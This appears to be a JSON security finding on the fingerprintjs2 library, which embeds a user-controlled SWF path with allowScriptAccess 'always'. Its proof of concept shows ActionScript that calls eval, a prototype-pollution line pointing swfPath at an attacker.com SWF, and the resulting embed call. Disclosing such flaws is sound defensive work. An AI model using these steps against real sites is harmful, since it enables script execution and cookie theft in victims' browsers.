{"valid":true,"title":"Arbitrary SWF Loading with `allowScriptAccess: "always"` Enables Full JavaScript Code Execution","summary":"The `loadSwfAndDetectFonts()` function in `fingerprintjs2/fingerprint2.js` (lines 1039–1048) uses `swfobject.embedSWF(this.options.swfPath, ...)` with `allowScriptAccess: "always"`. The `swfPath` option is passed directly from user-supplied constructor options into `embedSWF` without any validation.

The `extend()` function (lines 68–75) iterates user-provided options using `for...in` **without a `hasOwnProperty` check**, meaning prototype-polluted properties flow into `this.options`. An attacker who can run script on the same page — or who controls a page that includes this library — can supply a custom `swfPath` pointing to an attacker-controlled SWF file. The `allowScriptAccess: "always"` parameter unconditionally grants any loaded SWF full access to call any JavaScript function on the `window` object via `ExternalInterface.call()`. A malicious SWF simply calls `ExternalInterface.call("eval", "<payload>")` to execute arbitrary JavaScript, completely independently of what the `onReady` flashvar contains.

This is equivalent to stored/reflected XSS depending on context. An attacker who can influence the options passed to `new Fingerprint2(options)` (e.g., via URL parameters processed by the host page, prototype pollution via another vulnerability, or by being the developer of an app that uses this library with untrusted input) can achieve full JavaScript execution in the victim's browser. With Flash now deprecated, exploitation is limited to older browsers/systems that still run Flash Player, but on those systems the impact is complete JS code execution (session theft, credential harvesting, DOM manipulation, etc.).","proofOfConcept":"**Prerequisites:** A page using fingerprintjs2 where `swfPath` can be influenced by an attacker (via prototype pollution, URL-driven options, or a second-party integrating library with user-supplied config), running in a browser with Flash Player installed.

**Steps to reproduce:**

1. Create a malicious ActionScript SWF that calls `eval` with arbitrary JS:
```actionscript
import flash.external.ExternalInterface;
public function MaliciousFont() {
  ExternalInterface.call("eval", "alert(document.cookie)");
}
```
Compile it and host it at `https://attacker.com/evil.swf`.

2. On a page that uses fingerprintjs2, prototype-pollute `swfPath` before `new Fingerprint2()` is instantiated:
```javascript
// Prototype pollution via __proto__
Object.prototype.swfPath = 'https://attacker.com/evil.swf';
// OR supply directly if the page passes user-controlled options:
new Fingerprint2({ swfPath: 'https://attacker.com/evil.swf', excludeJsFonts: true }).get(callback);
```

3. When `loadSwfAndDetectFonts()` runs, it calls:
```javascript
swfobject.embedSWF('https://attacker.com/evil.swf', id, '1', '1', '9.0.0', false, flashvars, { allowScriptAccess: 'always', menu: 'false' }, {});
```

4. The browser embeds the attacker's SWF with `allowScriptAccess: always`. The SWF calls `ExternalInterface.call('eval', 'alert(document.cookie)')`, executing arbitrary JS in the page's origin context.

**Note on the `extend()` prototype pollution path:** The `extend(source, target)` function uses `for (var k in source)` without `hasOwnProperty`, so if `Object.prototype.swfPath` is polluted by any other vulnerability on the page, it will be read as `source.swfPath` and override the default in `target` (defaultOptions).","severity":"high"}
